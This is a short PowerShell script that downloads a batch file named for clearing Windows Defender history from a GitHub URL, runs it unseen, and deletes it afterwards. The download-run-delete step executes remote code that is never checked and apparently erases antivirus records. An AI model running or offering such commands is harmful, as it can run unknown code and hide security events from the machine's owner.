$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

cls

$defenderUrl = "https://raw.githubusercontent.com/jk-5/PS1Install/main/Files/Clear_Windows_Defender_History.cmd"
$defenderInstaller = "$env:TEMP\defender.cmd"
Invoke-WebRequest -Uri $defenderUrl -OutFile $defenderInstaller
Start-Process -FilePath $defenderInstaller -Wait
Remove-Item -Path $defenderInstaller
